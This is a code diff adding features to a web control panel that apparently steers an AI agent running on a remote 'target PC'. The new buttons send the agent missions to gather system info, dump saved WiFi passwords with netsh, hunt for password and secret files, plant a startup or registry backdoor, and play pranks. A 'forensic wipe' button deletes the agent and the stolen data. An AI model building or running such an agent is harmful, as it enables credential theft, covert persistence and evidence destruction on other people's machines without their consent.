@@ -55,6 +55,9 @@
             .controls > div:last-child { border-bottom: none; padding-bottom: 0; }
             .ai-config select, .ai-config input, .ai-config button { width: 100%; box-sizing: border-box; }
         }
+        
+        .quick-skill-btn { padding: 8px 12px; background: #3f3f46; border: 1px solid #52525b; border-radius: 4px; font-size: 12px; transition: 0.2s; }
+        .quick-skill-btn:hover { background: #8b5cf6; border-color: #7c3aed; }
     </style>
 </head>
 <body>
@@ -130,6 +133,22 @@
         <div class="command-box">
             <input type="text" id="cmdInput" placeholder="Type a command for the AI (e.g., 'click Chrome', 'type Hello')">
             <button id="sendBtn">Send Command</button>
+        </div>
+
+        <div style="margin-top: 15px;">
+            <div class="mode-text" style="margin-bottom: 8px; color: #a1a1aa;">Quick Hardware Missions (Simulated via AI):</div>
+            <div style="display: flex; gap: 10px; flex-wrap: wrap;">
+                <button class="quick-skill-btn" onclick="triggerSkill('Recon')">Misi 1: Recon</button>
+                <button class="quick-skill-btn" onclick="triggerSkill('Wifi Harvest')">Misi 2: Steal WiFi</button>
+                <button class="quick-skill-btn" onclick="triggerSkill('Data Thief')">Misi 3: Data Thief</button>
+                <button class="quick-skill-btn" onclick="triggerSkill('Persistence')">Misi 4: Persistence</button>
+                <button class="quick-skill-btn" onclick="triggerSkill('Prankster')">Misi 5: Prankster</button>
+            </div>
+        </div>
+
+        <div style="margin-top: 15px; border-top: 1px dashed #ef4444; padding-top: 15px;">
+            <div class="mode-text" style="margin-bottom: 8px; color: #ef4444; font-weight: bold;">⚠️ DANGER ZONE:</div>
+            <button id="wipeBtn" style="background-color: #ef4444; width: 100%; border: 1px solid #b91c1c;">Nuke / Forensic Wipe Agent</button>
         </div>
 
         <div class="terminal" id="terminalLog">
@@ -261,6 +280,40 @@
         sendBtn.addEventListener('click', sendCommand);
         cmdInput.addEventListener('keypress', (e) => {
             if (e.key === 'Enter') sendCommand();
+        });
+
+        // Quick Skill Functions
+        function triggerSkill(skillName) {
+            let missionText = "";
+            switch(skillName) {
+                case 'Recon': missionText = "Find system info, IP address, and PC name. Open notepad and write it down."; break;
+                case 'Wifi Harvest': missionText = "Open CMD and run 'netsh wlan show profile'. Extract all passwords and show them on screen."; break;
+                case 'Data Thief': missionText = "Search the C: drive for files named 'password', 'secret', or '.txt' and open them."; break;
+                case 'Persistence': missionText = "Add a startup shortcut or registry key to make a backdoor persistent."; break;
+                case 'Prankster': missionText = "Open YouTube and play a loud scary video or Rick Roll full screen."; break;
+            }
+            
+            // Set the custom mission and save config
+            document.getElementById('aiSkill').value = 'default';
+            document.getElementById('customMissionInput').value = missionText;
+            document.getElementById('saveAiConfigBtn').click();
+            
+            log(`Triggered Hardware Skill: ${skillName}`);
+            
+            // If autopilot is off, turn it on to execute the mission
+            if(!document.getElementById('autopilotSwitch').checked) {
+                document.getElementById('autopilotSwitch').click();
+            }
+        }
+
+        // Wipe Button Logic
+        document.getElementById('wipeBtn').addEventListener('click', () => {
+            if (confirm("WARNING: This will permanently delete the agent script and all stolen data from the target PC. Proceed?")) {
+                socket.emit('trigger_wipe');
+                log("SENT WIPE COMMAND TO AGENT.");
+                document.getElementById('statusBadge').className = 'status-badge offline';
+                document.getElementById('statusBadge').textContent = '☠️ DEAD';
+            }
         });
     </script>
 </body>
